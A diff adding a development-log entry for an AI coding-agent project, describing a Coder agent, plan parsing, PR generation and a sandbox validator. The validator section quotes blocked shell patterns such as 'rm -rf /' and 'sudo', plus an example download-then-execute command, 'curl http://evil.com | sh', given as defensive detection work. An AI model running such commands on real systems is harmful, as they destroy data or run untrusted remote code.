@@ -1532,3 +1532,59 @@ backends.
 
 M17 (Coder Agent) creates the builder agent that receives plans from PM
 and implements them in worktrees. M18 wires PM + Coder for end-to-end.
+
+---
+
+## 2026-02-25 — M17: Coder Agent
+
+### What was built
+
+Coder agent implementation in `internal/agent/coder.go` — the builder that
+receives plans from PM and implements them in isolated worktrees.
+
+**CoderRunner** — wraps `AgentRunner` with Coder-specific configuration:
+- `RunWithPlan(ctx, plan, channel, thread)` — injects the PM's plan as the
+  initial user message and runs the agent loop within the worktree context.
+- `CoderConfig` holds worktree path, base/head branches, model, and max turns.
+- `DefaultCoderConfig()` provides sensible defaults (Sonnet, 50 turns, main base).
+
+**Plan Parsing**:
+- `ParsePlan(message)` — extracts the plan body and file references.
+- `ExtractFileRefs(text)` — regex-based extraction of `file.go:42` patterns
+  with deduplication by full match string.
+
+**Sandbox Enforcement**:
+- `SandboxValidator` — validates paths stay within the worktree (rejects
+  absolute paths outside worktree and `..` directory traversal).
+- `ValidateCommand` — blocks dangerous shell patterns: `rm -rf /`, `sudo`,
+  `chmod 777`, `eval`, `> /dev/`, and pipe-to-shell attacks.
+
+**PR Generation**:
+- `PRDescription(plan, filesChanged)` — generates a structured PR description
+  with summary, file listing, and CodeButler attribution.
+
+### Design decisions
+
+**Pipe-to-shell detection via pipe splitting.** The original approach used
+literal `"curl | sh"` pattern matching, which missed `"curl http://evil.com | sh"`
+because the URL sits between `curl` and `| sh`. The fix splits on `|` and
+checks if the right side starts with a shell interpreter (`sh`, `bash`, `zsh`,
+`dash`). This catches any download-then-execute pattern regardless of the
+arguments to the download command.
+
+**File ref dedup by full match string.** `ExtractFileRefs` deduplicates by the
+complete match (e.g., `"internal/auth/handler.go:42"`), not by path alone.
+This means the same file at different line numbers is preserved as separate
+refs — which is the correct behavior when a plan references multiple locations
+in the same file.
+
+**CoderRunner wraps AgentRunner.** Rather than duplicating the agent loop,
+`CoderRunner` embeds `*AgentRunner` and adds Coder-specific initialization.
+The `RunWithPlan` method constructs a `Task` with the plan as the first
+message, then delegates to the standard `Run` loop. All safety features from
+M7 (stuck detection, escape strategies, context compaction) apply automatically.
+
+### What's next
+
+M18 (End-to-End: User → PM → Coder → PR) wires the PM and Coder together
+for the first working flow from Slack message to pull request.
